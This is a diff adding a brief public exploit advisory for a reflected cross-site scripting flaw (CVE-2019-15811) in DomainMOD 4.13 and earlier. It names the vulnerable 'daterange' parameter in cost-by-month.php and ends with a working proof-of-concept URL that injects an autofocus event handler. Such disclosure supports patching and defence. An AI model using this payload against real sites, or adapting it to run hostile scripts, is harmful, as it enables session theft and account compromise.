@@ -1,0 +1,19 @@
+# Exploit Title: DomainMod <= 4.13 - Cross-Site Scripting
+# Date: 30 August 2019
+# Exploit Author: Damian Ebelties (https://zerodays.lol/)
+# Vendor Homepage: https://domainmod.org/
+# Version: <= 4.13
+# Tested on: Ubuntu 18.04.1
+# CVE: CVE-2019-15811
+
+The software 'DomainMOD' is vulnerable for Cross-Site Scripting in the
+file '/reporting/domains/cost-by-month.php' in the parameter 'daterange'.
+
+As of today (30 August 2019) this issue is unfixed.
+
+Almost all other files that use the parameter 'daterange' are vulnerable.
+See: https://github.com/domainmod/domainmod/tree/master/reporting/domains
+
+Proof-of-Concept:
+
+    https://domain.tld/reporting/domains/cost-by-month.php?daterange=%22onfocus=%22alert(1)%22autofocus=%22
